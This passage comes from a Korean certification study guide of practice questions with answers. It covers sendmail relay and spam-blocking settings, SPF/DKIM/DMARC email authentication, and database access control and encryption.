- <strong>Header(헤더)</strong>: Subject, Date, From, Received
</blockquote>
</details>

<details>
<summary>(작업형) 공격자가 <code>Subject:</code>와 <code>From:</code> 헤더를 조작하여 피싱 메일을 보냈으나, 서버에 의해 차단되었다. 이때 서버가 차단의 근거로 사용한 헤더 필드 중 전송 경로 기록을 담은 필드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>Received</strong> 필드 (또는 <strong>Return-Path</strong>)
</blockquote>
</details>

### 메일서버(sendmail) 보안 설정

<details>
<summary>(단답형) 메일 서버 외부에서 해당 서버를 경유하여 다른 메일 서버로 메일을 전송하는 행위를 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>SMTP 릴레이 (Relay)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 발신자에 대한 IP나 계정 인증 없이 모든 메일의 릴레이를 허용하여 스팸 메일의 중계지로 악용될 수 있는 서버를 무엇이라 부르는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>오픈 릴레이 (Open Relay)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 클라이언트가 메일을 보낼 때 반드시 아이디와 암호를 사용하여 인증을 거쳐야만 발송이 가능하도록 하는 보안 기능은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SMTP AUTH</strong> (또는 메일 발신 인증)
</blockquote>
</details>

<details>
<summary>(단답형) 센드메일(Sendmail)에서 스팸 차단 및 릴레이 제한 정책을 정의하는 텍스트 설정 파일의 경로는?</summary>
<blockquote>
<strong>정답:</strong> <strong>/etc/mail/access</strong>
</blockquote>
</details>

<details>
<summary>(단답형) <code>/etc/mail/access</code> 텍스트 파일을 센드메일이 인식할 수 있는 데이터베이스 형태(<code>access.db</code>)로 변환할 때 사용하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>makemap</strong>
</blockquote>
</details>

<details>
<summary>(단답형) <code>access</code> 설정 파일의 처리 방식(Action) 중 메일을 거부하고 상대방에게 "Access denied"와 같은 거부 메시지를 반환하는 설정값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>REJECT</strong>
</blockquote>
</details>

<details>
<summary>(단답형) <code>access</code> 설정 파일의 처리 방식 중 메일을 폐기하되 발신자에게는 거부 메시지를 보내지 않아 발송 성공으로 오인하게 만드는 설정값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DISCARD</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 센드메일 서버의 운영 전반에 걸친 핵심 환경 정보를 담고 있는 메인 설정 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>sendmail.cf</strong> (또는 <code>/etc/mail/sendmail.cf</code>)
</blockquote>
</details>

<details>
<summary>(서술형) <strong>오픈 릴레이(Open Relay)</strong> 형태의 메일 서버가 보안상 매우 위험한 이유를 스팸 메일 발송자의 관점에서 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 오픈 릴레이 서버는 발신자 인증을 수행하지 않으므로, 공격자나 스패머가 <strong>자신의 정체를 숨기고 해당 서버의 자원을 이용</strong>하여 대량의 스팸, 피싱, 악성 메일을 유포하는 '무료 중계 기지'로 악용될 수 있기 때문이다.
</blockquote>
</details>

<details>
<summary>(서술형) <code>access</code> 파일 수정한 후 단순히 저장만 해서는 정책이 반영되지 않는다. 이를 해결하기 위한 절차를 <strong>makemap</strong> 명령어와 관련 지어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 센드메일 데몬은 텍스트 파일이 아닌 해시 기반의 <strong>DB 파일(access.db)</strong>을 참조한다. 따라서 텍스트 수정 후 반드시 <code>makemap hash /etc/mail/access < /etc/mail/access</code> 명령을 수행하여 DB 파일을 실시간으로 생성/갱신해 주어야 정책이 서비스에 반영된다.
</blockquote>
</details>

<details>
<summary>(서술형) 스팸 차단 설정에서 <strong>REJECT</strong> 대신 <strong>DISCARD</strong>를 사용할 때 발생할 수 있는 현상을 발신자와 관리자 측면에서 비교 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>발신자</strong>는 거부 메시지를 받지 못하므로 메일이 정상적으로 도착한 것으로 오인하게 되며, <strong>관리자</strong> 측면에서는 거부 메시지 발송에 따른 서버 부하 및 네트워크 트래픽을 줄이고 공격자에게 필터링 정보를 노출하지 않는 보안적 효과를 얻을 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 요구사항에 맞게 <code>/etc/mail/access</code> 파일의 설정 구문을 작성하시오.<br>(1) 도메인이 <code>spam.com</code>인 모든 메일 차단(REJECT)<br>(2) 네트워크 대역이 <code>192.168.100.0/24</code>인 호스트들의 릴레이 허용</summary>
<blockquote>
<strong>정답:</strong><br>
(1) <strong>spam.com REJECT</strong><br>
(2) <strong>192.168.100 RELAY</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 특정 주소 <code>hacker@evil.com</code>으로부터 오는 메일에 대해 "You are blocked!"라는 사용자 정의 거부 메시지를 출력하도록 설정하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>hacker@evil.com 501 You are blocked!</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 명령어의 의미를 분석하시오.<br><code>makemap hash /etc/mail/access < /etc/mail/access</code></summary>
<blockquote>
<strong>정답:</strong> 텍스트 형태의 <code>access</code> 파일을 읽어 들여, 검색 속도가 빠른 <strong>Hash 방식의 데이터베이스 파일(access.db)</strong>로 생성 또는 갱신하는 명령이다.
</blockquote>
</details>

<details>
<summary>[기출 20회 14번 문제] (실무형) Sendmail 릴레이 제한 설정 파일(1), 스팸 차단 옵션(2), DB 생성 명령어(3), DB 파일명(4)을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (1) <strong>sendmail.cf</strong>, (2) <strong>REJECT 또는 DISCARD</strong>, (3) <strong>makemap</strong>, (4) <strong>access.db</strong>
</blockquote>
</details>

<details>
<summary>[기출 21회 1번 문제] (단답형) Sendmail에서 스팸메일 릴레이 제한 설정 후 access DB를 생성하기 위한 명령어를 완성하시오.<br>
<code># (A) (B) /etc/mail/access.db < /etc/mail/access</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>makemap</strong>, (B) <strong>hash</strong>
</blockquote>
</details>

### 이메일 인증 기술(스팸 메일 방지 기술)

<details>
<summary>(단답형) 발송 도메인의 DNS에 해당 도메인에서 메일을 보낼 정당한 서버 IP 목록을 등록하여, 수신 서버가 발신자 IP와 대조하게 함으로써 사칭 여부를 확인하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SPF (Sender Policy Framework)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 본문과 주요 헤더에 디지털 서명을 추가하여, 수신 측에서 발신 도메인의 공개키로 검증함으로써 위변조 여부와 발신자 정당성을 확인하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DKIM (DomainKeys Identified Mail)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SPF와 DKIM의 인증 결과를 통합하여 일관된 보안 정책을 수립하고, 인증 실패 시의 처리 방안(Reject 등)을 명시하며 수신 측으로부터 결과를 보고받는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DMARC</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SPF 레코드에서 메커니즘과 일치할 경우 즉시 '인증 실패(Hard Fail)'로 간주하여 강력하게 수신을 차단하도록 요구하는 한정자(Qualifier) 기호는?</summary>
<blockquote>
<strong>정답:</strong> <strong>-</strong> (마이너스)
</blockquote>
</details>

<details>
<summary>(단답형) SPF 레코드의 메커니즘 중 지정된 다른 도메인의 SPF 정책 정보를 그대로 참조(가져오기)하도록 하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>include</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일 클라이언트가 수신한 이메일에서 SPF, DKIM, DMARC 인증 결과가 모두 기록되어 있는 통합 헤더 필드의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Authentication-Results</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 메일이 경유한 모든 메일 서버(MTA)의 정보가 하단에서 상단 순으로 기록되어 발송 근원지를 역추적하는 데 결정적인 단서가 되는 헤더 필드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>Received</strong>
</blockquote>
</details>

<details>
<summary>(단답형) DMARC 정책 옵션 중 인증 실패 시 해당 메일을 수신 거부하지 않고 스팸함으로 보내도록(격리) 요청할 때 사용하는 태그 값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>quarantine</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>SPF</strong> 기술이 메일 스푸핑을 차단하는 원리를 DNS 서버의 역할을 포함하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 도메인 관리자가 자신의 <strong>DNS 서버에 전송 가능한 정당한 서버 IP 목록(TXT 레코드)</strong>을 미리 등록해 둔다. 수신 서버는 메일을 받았을 때 발신 도메인의 DNS를 조회하여 <strong>실제 메일을 보낸 IP</strong>가 등록된 목록에 존재하는지 대조함으로써 인가되지 않은 서버의 사칭 여부를 판단한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>DKIM</strong>이 메일의 무결성(Integrity)을 보장하는 기술적 원리를 디지털 서명 생성 및 검증 과정을 중심으로 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 발신 서버는 메일 발송 시 본문과 주요 헤더의 해시값을 <strong>자신의 개인키로 서명</strong>하여 헤더에 삽입한다. 수신 서버는 발송 도메인의 DNS에서 <strong>공개키</strong>를 가져와 이 서명을 검증한다. 만약 전송 도중 내용이 변조되었다면 서명 검증이 실패하므로 메일의 무결성과 발신자의 정당성을 동시에 확인할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) SPF 레코드 설정값 중 <strong>-all</strong> (Hard Fail)과 <strong>~all</strong> (Soft Fail)이 수신 측 서버 정책에 따라 상이하게 동작하는 방식을 비교 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>-all</strong>은 정의된 IP 외의 모든 발신을 명백한 인증 실패로 규정하여 <strong>강력하게 수신을 차단</strong>할 것을 요구한다. 반면 <strong>~all</strong>은 가벼운 인증 실패로 규정하여, 인증은 실패했으나 차단 여부는 <strong>수신 측 서버의 자체 보안 정책</strong>(스팸 처리 등)에 따라 유연하게 결정하도록 유도한다.
</blockquote>
</details>

<details>
<summary>(서술형) 이메일 인증 기술인 SPF와 DKIM을 모두 도입했음에도 불구하고 <strong>DMARC</strong>를 추가로 적용하여 얻을 수 있는 전략적 이점 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 1. SPF와 DKIM의 인증 결과를 통합하여 일관된 <strong>보안 처리 정책(차단, 격리 등)</strong>을 수립할 수 있다. 2. 수신 서버로부터 <strong>DMARC 리포트(rua등)</strong>를 전달받아 자신의 도메인이 사칭 메일에 도용되고 있는지 실시간으로 모니터링할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 SPF 레코드의 의미를 분석하시오.<br><code>v=spf1 ip4:211.252.150.8 include:_spf.google.com -all</code></summary>
<blockquote>
<strong>정답:</strong> <strong>IPv4 주소 211.252.150.8</strong>과 <strong>google.com 도메인의 SPF 레코드에 등록된 서버</strong>들로부터의 메일은 인증을 통과(Pass)시키고, 그 외의 모든 주소(-all)로부터 온 메일은 <strong>강력하게 거부(Hard Fail)</strong>하라는 의미이다.
</blockquote>
</details>

<details>
<summary>(작업형) 받은 메일의 헤더 정보 <code>dkim=pass spf=fail dmarc=fail</code>를 보고, 해당 메일의 보안 상태를 진단하시오.</summary>
<blockquote>
<strong>정답:</strong> 메일 본문의 디지털 서명은 유효하여 <strong>무결성은 보장(dkim=pass)</strong>되나, 인가되지 않은 IP에서 발송되었거나(spf=fail) 전체 통합 정책을 만족하지 못해(dmarc=fail) <strong>사칭(Spoofing) 메일일 가능성이 매우 높음</strong>을 의미한다.
</blockquote>
</details>

<details>
<summary>(작업형) <code>Received</code> 헤더에 기록된 Cipher Suite가 <code>ECDHE-RSA-AES128-GCM-SHA256</code>일 때, 각 요소가 담당하는 기능을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>ECDHE</strong>: 타원곡선 임시 디피-헬만을 이용한 <strong>키 교환</strong><br>
- <strong>RSA</strong>: 인증서 검증 및 파라미터 <strong>서명/인증</strong><br>
- <strong>AES128</strong>: 128비트 키를 사용하는 <strong>대칭키 블록 암호화</strong><br>
- <strong>GCM</strong>: 인증 기능이 포함된 <strong>블록 암호 운영 모드</strong><br>
- <strong>SHA256</strong>: 메시지 위변조 방지를 위한 <strong>해시(MAC) 알고리즘</strong>
</blockquote>
</details>

<details>
<summary>(작업형) DMARC 레코드 설정 예시 <code>v=DMARC1; p=reject; rua=mailto:admin@test.com</code>에서 각 태그의 의미를 분석하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>v=DMARC1</strong>: DMARC 프로토콜 버전 1 사용<br>
- <strong>p=reject</strong>: 인증 실패 시 해당 메일을 즉시 <strong>수신 거부(차단)</strong>하는 정책 수립<br>
- <strong>rua</strong>: 인증 결과에 대한 <strong>종합 리포트</strong>를 수신할 이메일 주소 지정
</blockquote>
</details>

<details>
<summary>[567] (단답형) 최근 랜섬웨어 메일이나 악성 문서 파일 공격을 방어하기 위해 도입되는 기술로, 유입되는 파일에서 문서 구조만 추출하고 스크립트나 매크로 등 위협이 될 수 있는 요소들을 제거한 뒤 안전한 형태(PDF 등)로 재조합하여 내부로 반입하는 기술의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>CDR</code> (Content Disarm & Reconstruction)
</blockquote>
</details>

## [11] 데이터베이스 보안

### 데이터베이스 보안 위협과 통제

<details>
<summary>(단답형) 보안 등급이 낮은 여러 개의 개별 정보 조각들을 조합하여 보안 등급이 높은 기밀 정보를 알아내는 보안 위협은?</summary>
<blockquote>
<strong>정답:</strong> <strong>집성 (Aggregation)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 일반적인 통계 질의 등 보안 등급이 없는 정보에 정당하게 접근하여, 기밀로 분류된 민감한 정보를 논리적으로 유추해 내는 보안 위협은?</summary>
<blockquote>
<strong>정답:</strong> <strong>추론 (Inference)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 데이터베이스 사용자에게 허용된 권한 범위 내에서만 데이터 접근 및 작업(읽기, 수정 등)을 수행하게 하는 가장 기본적인 기술적 보안 대책은?</summary>
<blockquote>
<strong>정답:</strong> <strong>접근 제어 (Access Control)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 정보의 흐름을 관리하며, 보안 등급이 높은 객체에서 보안 등급이 낮은 객체로 데이터가 복사되거나 이동하는 것을 차단하는 통제 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>흐름 제어 (Flow Control)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>집성(Aggregation)</strong>의 위험성을 각 영업점의 매출 정보 예시를 들어 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 개별 영업점의 매출액은 상대적으로 보안 등급이 낮아 공개될 수 있으나, 이를 <strong>데이터베이스 상에서 모두 결합(집성)</strong>하여 회사의 '총 매출액'을 산출하게 되면 이는 기밀성이 높은 대외비 정보가 된다. 즉, 하위 정보의 결합이 상위 수준의 기밀 유출로 이어지는 문제가 발생한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>추론(Inference)</strong> 위협에 대응하기 위한 <strong>추론 통제</strong> 방법 중 질의 응답과 관련된 기술적 방안 3가지를 서술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>질의 수 제한</strong>: 특정 대상에 대해 허용 가능한 질의의 횟수를 제한한다.<br>
2. <strong>데이터 한정</strong>: 질의의 응답으로 제공되는 데이터의 양이나 범위를 축소한다.<br>
3. <strong>노이즈 삽입</strong>: 데이터가 숫자인 경우 반올림을 하거나, 의도적으로 약간씩 일관성 없는 결과를 제공하여 정확한 기밀 유추를 방해한다.
</blockquote>
</details>

<details>
<summary>(서술형) 데이터베이스 관리자(DBA)가 <strong>접근 제어</strong> 정책을 수립할 때 구체적으로 결정해야 하는 사항 3가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. 사용자가 <strong>접근 가능한 데이터(Table, View 등)의 범위</strong> 지정<br>
2. 데이터의 <strong>접근 수준(레코드 단위 또는 필드 단위)</strong> 결정<br>
3. 데이터에 대해 <strong>허용할 작업(Select, Update, Insert, Delete 등)</strong>의 정의
</blockquote>
</details>

<details>
<summary>(작업형) 특정 직원이 "계약직 직원의 평균 연봉"을 질의했으나, 해당 그룹의 인원수가 1명뿐이어서 실질적으로 특정 개인의 연봉 정보가 노출되었다. 이 상황은 어떤 보안 위협에 해당하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>추론 (Inference)</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 중 <strong>흐름 제어(Flow Control)</strong> 정책상 차단되어야 하는 정보의 이동 방향을 고르시오.<br>(A) 낮은 등급 객체 → 높은 등급 객체<br>(B) 높은 등급 객체 → 낮은 등급 객체</summary>
<blockquote>
<strong>정답:</strong> <strong>(B)</strong> (높은 보안 등급의 정보가 낮은 등급의 환경으로 흘러가는 것은 기밀성 위반에 해당함)
</blockquote>
</details>

<details>
<summary>(작업형) 다음 데이터베이스 보안 통제 기법을 각각 연결하시오.<br>(1) 기밀성 유출 방지를 위한 데이터 결합 통제 / (2) 통계값으로부터 개별 개체 정보 유추 차단 / (3) 등급 간 데이터 이동 관리</summary>
<blockquote>
<strong>정답:</strong> (1) <strong>집성 통제</strong>, (2) <strong>추론 통제</strong>, (3) <strong>흐름 제어</strong>
</blockquote>
</details>

### DBMS 보안 통제

<details>
<summary>(단답형) 사용자에게 데이터베이스 객체에 대한 권한을 부여하거나 회수하며 보안 및 무결성을 보장하기 위해 사용하는 SQL 문 분류(분류명)는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DCL (Data Control Language)</strong> (데이터 제어어)
</blockquote>
</details>

<details>
<summary>(단답형) DDL(Data Definition Language)에 해당하며, 기존에 생성된 데이터베이스 객체의 구조를 변경할 때 사용하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>ALTER</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 트랜잭션 제어를 위해 작업의 결과를 확정 지어 데이터베이스에 영구적으로 반영하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>COMMIT</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 하나 이상의 기본 테이블로부터 유도된 가상의 테이블로, 특정 컬럼만 사용자에게 제공함으로써 민감한 데이터의 노출을 제한하는 보안 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>뷰 (View)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) MySQL에서 특정 사용자에게 부여된 권한을 확인하기 위해 사용하는 명령어(Show로 시작)는?</summary>
<blockquote>
<strong>정답:</strong> <strong>SHOW GRANTS (FOR 사용자)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 부여받은 권한을 다른 사용자에게 재발급(전파)할 수 있는 권한을 함께 부여할 때 사용하는 옵션의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>WITH GRANT OPTION</strong>
</blockquote>
</details>

<details>
<summary>(단답형) MySQL에서 계정은 생성되었으나 아직 데이터베이스 객체에 대한 세부 권한이 전혀 없는 상태를 나타내는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>USAGE</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>뷰(View)</strong>를 이용한 접근 통제 방식이 보안상 갖는 이점과 그 처리 특성(Materialization)에 대해 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 뷰는 기본 테이블에서 보안상 민감하지 않은 컬럼들만 선별하여 정의할 수 있으므로 <strong>불필요한 데이터 노출을 은닉</strong>하는 효과가 있다. 또한, 뷰는 실제 데이터를 저장하지 않고 조작 요구 시마다 기본 테이블로부터 데이터를 가져오는 <strong>실행 시간 구체화(Dynamic Materialization)</strong> 특성을 갖는다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>SQL 기반 접근 통제(GRANT/REVOKE)</strong> 기법이 뷰(View) 기법에 비해 보안 관리 측면에서 갖는 차별점(강점)을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 뷰 기법은 노출되는 <strong>데이터의 범위(객체 범위)</strong>를 제한하는 데 초점이 맞춰져 있는 반면, GRANT/REVOKE 기법은 해당 객체에 대해 수행할 수 있는 <strong>작업의 종류(Select, Update, Insert 등)</strong>를 세밀하게 제어할 수 있다는 강점이 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>TCL(Transaction Control Language)</strong>이 데이터베이스의 무결성(Integrity) 유지에 기여하는 원리를 <strong>ROLLBACK</strong> 명령어의 역할을 중심으로 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> TCL은 논리적인 작업 단위인 트랜잭션을 제어한다. 작업 과정 중 보안 위반이나 시스템 오류가 발생했을 경우 <code>ROLLBACK</code> 명령을 통해 해당 트랜잭션 내에서 수행된 모든 변경 사항을 취소하고 <strong>이전의 일관된 상태로 되돌림</strong>으로써 데이터 무결성을 보장한다.
</blockquote>
</details>

<details>
<summary>(작업형) MySQL에서 <code>user_a</code>에게 <code>prod_db</code>의 <code>salary</code> 테이블에 대한 조회(SELECT) 및 수정(UPDATE) 권한을 부여하는 SQL 문을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>GRANT SELECT, UPDATE ON prod_db.salary TO 'user_a'@'localhost';</code>
</blockquote>
</details>

<details>
<summary>(작업형) <code>user_a</code>에게 부여된 <code>salary</code> 테이블에 대한 모든 조회 권한을 회수(취소)하는 SQL 문을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>REVOKE SELECT ON prod_db.salary FROM 'user_a'@'localhost';</code>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 명령어의 의미를 해석하시오.<br><code>GRANT SELECT ON kiwi_db.member TO algisa@localhost WITH GRANT OPTION;</code></summary>
<blockquote>
<strong>정답:</strong> <code>algisa</code> 사용자에게 <code>kiwi_db</code> 데이터베이스의 <code>member</code> 테이블을 조회할 수 있는 <strong>SELECT 권한</strong>을 부여함과 동시에, <code>algisa</code>가 이 권한을 <strong>다른 사용자에게도 다시 부여(전파)</strong>할 수 있도록 권한 부여 대행 자격을 준다는 의미이다.
</blockquote>
</details>

<details>
<summary>(작업형) 아래의 SQL 명령어를 분류(DDL, DML, DCL, TCL)에 맞게 연결하시오.<br>(1) DROP, ALTER / (2) SELECT, DELETE / (3) REVOKE / (4) ROLLBACK</summary>
<blockquote>
<strong>정답:</strong> (1) <strong>DDL</strong>, (2) <strong>DML</strong>, (3) <strong>DCL</strong>, (4) <strong>TCL</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 기본 테이블 <code>member</code>에서 <code>id</code>, <code>name</code> 필드만 추출하여 <code>v_member</code>라는 이름의 보안용 뷰를 생성하는 SQL 문을 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>CREATE VIEW v_member AS SELECT id, name FROM member;</code>
</blockquote>
</details>

### 데이터베이스 암호화 기술

<details>
<summary>(단답형) 데이터베이스 암호화 방식 중, 테이블 내의 특정 열(Column)을 지정하여 해당 데이터만 선택적으로 암호화하여 저장하는 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>컬럼 암호화 방식</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 암·복호화 모듈이 라이브러리 형태로 애플리케이션 서버에 위치하며, 서비스 프로그램에서 해당 모듈을 직접 호출하여 수행하는 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>API 방식</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 암·복호화 모듈이 DB 서버에 설치되어 DBMS 커널이나 별도의 에이전트(Plug-In)에 의해 호출되어 수행되는 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Plug-In 방식</strong>
</blockquote>
</details>

<details>
<summary>(단답형) DBMS 커널 수전에서 데이터 파일 저장 시 자동 암호화하고, 메모리 영역으로 가져올 때 자동 복호화해 주는 투명한 암호화 기술의 약어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>TDE (Transparent Data Encryption)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 운영체제(OS) 커널 수준에서 파일 단위로 직접 암호화를 수행하여 이미지, 음성, 영상 등 비정형 데이터 암호화에 유리한 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>파일 암호화 방식</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 대용량 처리가 필요한 배치는 API 방식으로, 일반 트랜잭션은 Plug-In 방식으로 처리하여 성능과 구축 편의성을 절충한 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Hybrid (혼합) 방식</strong>
</blockquote>
</details>

<details>
<summary>(단답형) Plug-In 방식 도입 시 응용 프로그램의 쿼리 수정을 최소화하기 위해 원본 테이블 명과 동일하게 생성하여 통로 역할을 하는 객체는?</summary>
<blockquote>
<strong>정답:</strong> <strong>뷰 (View)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) Plug-In 방식에서 데이터 삽입/수정 이벤트 발생 시 즉시 반응하여 자동 암호화 작업을 수행하게 하는 DB 내장 객체는?</summary>
<blockquote>
<strong>정답:</strong> <strong>트리거 (Trigger)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>API 방식</strong>의 장점과 단점을 성능 및 개발 리소스 관점에서 각각 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>장점</strong>: 암·복호화가 애플리케이션 서버에서 수행되므로 <strong>DB 서버의 부하가 매우 적고 속도가 빨라</strong> 대용량 트랜잭션 처리에 유리하다.<br>
- <strong>단점</strong>: 기존 응용 프로그램의 <strong>소스 코드를 직접 수정</strong>해야 하므로 개발 비용이 높고 기구축된 시스템에 적용하기 어렵다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>Plug-In 방식</strong> 구축 시 데이터 은닉과 응용 프로그램 호환성을 확보하기 위해 사용되는 <strong>View</strong>와 <strong>Trigger</strong>의 역할을 각각 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>View</strong>는 암호화된 테이블로부터 데이터를 복호화하여 사용자에게 보여주는 통로 역할을 하며, <strong>Trigger</strong>는 DML 요청이 발생했을 때 이를 가로채어 데이터를 암호화한 뒤 실제 암호화 테이블에 저장하는 역할을 함으로써 기존 애플리케이션의 수정을 최소화한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>TDE</strong> 방식이 기존의 컬럼 암호화 방식에 비해 갖는 성능 및 운영상의 강점을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> DBMS 엔진 커널 수준에서 암·복호화가 최적화되어 처리되므로 <strong>성능 저하가 상대적으로 적고</strong>, 애플리케이션 소스나 DB 스키마 구조 변경이 거의 필요 없어 <strong>도입 및 유지보수가 매우 편리</strong>하다.
</blockquote>
</details>

<details>
<summary>(서술형) 로그 파일, 음성, 영상 등의 <strong>비정형 데이터</strong>를 암호화할 때 <strong>파일 암호화 방식</strong>이 추천되는 이유를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 파일 암호화는 운영체제(OS) 수준에서 파일을 직접 제어하므로, 특정 DBMS에 종속되지 않고 <strong>다양한 포맷의 파일 시스템 데이터 전체</strong>를 일괄적으로 암호화할 수 있어 비정형 데이터 처리에 효율적이다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 중 암호화 모듈의 호출 위치가 어플리케이션(Application) 서버인 방식은? (API, Plug-In, TDE, 파일 암호화).</summary>
<blockquote>
<strong>정답:</strong> <strong>API 방식</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 암호화 기술별 <strong>암호화 구간(보호 범위)</strong>을 비교할 때, '애플리케이션 서버와 DB 서버 사이의 구간'까지 암호화된 상태로 전송되는 방식을 고르시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>API 방식</strong> (애플리케이션에서 암호화되어 DB로 전송되므로 구간 통신 보호가 가능함)
</blockquote>
</details>

<details>
<summary>(작업형) 다음 요구사항에 가장 적합한 암호화 방식을 선정하시오.<br>"기존 운영 중인 시스템의 소스 수정은 불가능하며, CPU 부하가 다소 발생하더라도 관리의 편의성이 최우선임" </summary>
<blockquote>
<strong>정답:</strong> <strong>Plug-In 방식</strong> (또는 DBMS에 따라 TDE 방식)
</blockquote>
</details>

### 데이터베이스(MySQL) 취약점 점검

<details>
<summary>(단답형) MySQL 설치 시 생성되며 전역적인 사용자 정보와 접근 권한을 관리하는 핵심 시스템 테이블의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>mysql.user</strong> (또는 user 테이블)
</blockquote>
</details>

<details>
<summary>(단답형) 데이터베이스 사용자 정보나 권한을 수동으로 변경(Update 등)한 후, 변경 내용을 즉시 메모리에 반영하기 위해 수행하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>FLUSH PRIVILEGES</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 외부 네트워크를 통한 불필요한 원격 접속을 차단하기 위해 <code>my.cnf</code>에서 네트워크 소켓 통신 자체를 비활성화하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>skip-networking</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 외부 네트워크 접속을 차단(skip-networking)하더라도 로컬 호스트 내 응용 프로그램과의 통신을 위해 사용되는 유닉스 도메인 소켓 파일은?</summary>
<blockquote>
<strong>정답:</strong> <strong>mysql.sock</strong>
</blockquote>
</details>

<details>
<summary>(단답형) MySQL <code>user</code> 테이블의 <code>host</code> 컬럼 값 중, 모든 원격 호스트(로컬 제외)에서의 접속을 허용하는 의미로 쓰이는 와일드카드 문자는?</summary>
<blockquote>
<strong>정답:</strong> <strong>%</strong> (퍼센트)
</blockquote>
</details>

<details>
